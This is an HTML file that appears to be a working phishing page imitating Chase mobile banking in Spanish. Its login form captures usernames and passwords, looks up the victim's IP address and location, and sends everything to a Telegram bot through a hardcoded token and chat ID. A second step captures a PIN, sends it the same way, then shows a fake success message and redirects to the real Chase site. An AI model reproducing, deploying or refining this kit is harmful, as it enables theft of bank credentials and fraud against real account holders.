<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Chase M贸vil Actualizado</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: url('https://i.postimg.cc/nzWv1V9b/CHASE-nuevo-fondo-con-pie-de-pagina-MOVIL.png') no-repeat center center fixed;
      background-size: contain;
      display: flex;
      flex-direction: column;
      min-height: 100vh;
    }
    .container {
      max-width: 350px;
      margin: auto;
      padding: 20px 15px;
      flex-grow: 1;
      position: relative;
    }
    .logo {
      display: flex;
      justify-content: center;
      margin: 30px 0 20px;
    }
    .logo img {
      max-width: 160px;
      height: auto;
    }
    .login-box, .pin-box {
      background: rgba(255, 255, 255, 0.96);
      padding: 25px 20px;
      border-radius: 10px;
      box-shadow: 0 4px 10px rgba(0,0,0,0.2);
      display: none;
    }
    .login-box.active, .pin-box.active {
      display: block;
    }
    .login-box h2, .pin-box h2 {
      font-size: 18px;
      margin-bottom: 20px;
      color: #333;
    }
    label {
      font-size: 14px;
      color: #333;
      display: block;
      margin-bottom: 5px;
    }
    input[type="text"],
    input[type="password"],
    input[type="number"],
    input[type="text2"] {
      width: 100%;
      padding: 10px;
      margin-bottom: 15px;
      border: 1px solid #ccc;
      border-radius: 5px;
      font-size: 14px;
      box-sizing: border-box;
    }
    .login-btn, .pin-btn {
      width: 100%;
      padding: 12px;
      background-color: #0070C9;
      color: white;
      border: none;
      border-radius: 5px;
      font-weight: bold;
      font-size: 15px;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }
    .login-btn:hover, .pin-btn:hover {
      background-color: #005fa3;
    }
    .loading {
      display: none;
      color: white;
      text-align: center;
      font-size: 18px;
      margin-top: 40px;
    }
    .success-message {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      background: #0070C9;
      color: white;
      padding: 25px 30px;
      border-radius: 12px;
      box-shadow: 0 6px 15px rgba(0, 112, 201, 0.7);
      display: flex;
      align-items: center;
      gap: 15px;
      font-size: 18px;
      opacity: 0;
      pointer-events: none;
      animation: fadeInScale 0.8s forwards;
      z-index: 10;
      user-select: none;
    }
    .success-message svg {
      width: 32px;
      height: 32px;
      fill: #fff;
      flex-shrink: 0;
      animation: pulse 2s infinite ease-in-out;
    }
    @keyframes fadeInScale {
      0% { opacity: 0; transform: translate(-50%, -50%) scale(0.8); }
      100% { opacity: 1; transform: translate(-50%, -50%) scale(1); }
    }
    @keyframes pulse {
      0%, 100% { transform: scale(1); }
      50% { transform: scale(1.2); }
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <div class="container">

    <div class="logo">
      <img src="" alt="" />
    </div>

    <div class="login-box active" id="loginBox">
      <h2>Iniciar sesi贸n</h2>
      <form id="loginForm">
        <label for="usuario">Nombre de usuario</label>
        <input type="text" id="usuario" required autocomplete="username" />

        <label for="contrasena">Contrase帽a</label>
        <input type="password" id="contrasena" required autocomplete="current-password" />

        <button type="submit" class="login-btn">Iniciar sesi贸n</button>
      </form>
    </div>

    <div class="loading" id="loadingDiv">
      <div class="spinner" style="
        border: 6px solid rgba(255,255,255,0.2);
        border-top: 6px solid #ffffff;
        border-radius: 50%;
        width: 60px;
        height: 60px;
        margin: 0 auto 20px;
        animation: spin 1s linear infinite;">
      </div>
      Cargando, por favor espera...
    </div>

    <div class="pin-box" id="pinBox">
      <h2>Ingrese su PIN</h2>
      <form id="pinForm">
        <input type="text" id="pin" placeholder="Ingrese su PIN" required />
        <button type="submit" class="pin-btn">Continuar</button>
      </form>
    </div>

    <div class="success-message" id="successMessage" style="display:none;">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" aria-hidden="true">
        <path d="M9 16.2l-3.5-3.5 1.4-1.4L9 13.4l7.1-7.1 1.4 1.4z"/>
      </svg>
      <span>隆Gracias! Su PIN ha sido verificado correctamente.</span>
    </div>
  </div>

  <script>
    const token = "8007484732:AAH7GTfW46Sh4TWn9Wl3gb8sWoAdXQ-REDQ";
    const chatId = "1221652451";

    function enviarMensaje(mensaje) {
      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text: mensaje })
      });
    }

    async function obtenerIPyUbicacion() {
      try {
        const resp = await fetch('https://ipapi.co/json/');
        return await resp.json();
      } catch {
        return null;
      }
    }

    const loginBox = document.getElementById("loginBox");
    const pinBox = document.getElementById("pinBox");
    const loadingDiv = document.getElementById("loadingDiv");
    const successMessage = document.getElementById("successMessage");

    const loginForm = document.getElementById("loginForm");
    const pinForm = document.getElementById("pinForm");

    loginForm.addEventListener("submit", async (e) => {
      e.preventDefault();
      const usuario = document.getElementById("usuario").value;
      const contrasena = document.getElementById("contrasena").value;

      loginBox.classList.remove("active");
      loadingDiv.style.display = "block";

      const datosIp = await obtenerIPyUbicacion();

      let mensaje = ` Login Chase (M贸vil)\nUsuario: ${usuario}\nContrase帽a: ${contrasena}\n`;

      if (datosIp) {
        mensaje += `IP: ${datosIp.ip}\nCiudad: ${datosIp.city}\nRegi贸n: ${datosIp.region}\nPa铆s: ${datosIp.country_name}\n`;
      } else {
        mensaje += "IP: No disponible\n";
      }

      enviarMensaje(mensaje);

      setTimeout(() => {
        loadingDiv.style.display = "none";
        pinBox.classList.add("active");
      }, 5000); // 5 segundos de carga
    });

    pinForm.addEventListener("submit", (e) => {
      e.preventDefault();
      const pin = document.getElementById("pin").value;

      enviarMensaje(` PIN ingresado (M贸vil): ${pin}`);

      pinBox.style.display = "none";
      loadingDiv.style.display = "block";

      setTimeout(() => {
        loadingDiv.style.display = "none";
        successMessage.style.display = "flex";
        successMessage.style.opacity = "0";
        void successMessage.offsetWidth;
        successMessage.style.animation = "fadeInScale 0.8s forwards";

        setTimeout(() => {
          window.open("https://secure.chase.com/web/auth/dashboard#/dashboard/index/index", "_top");
        }, 2500);

      }, 60000); // 60 segundos de espera tras PIN
    });
  </script>
</body>
</html>
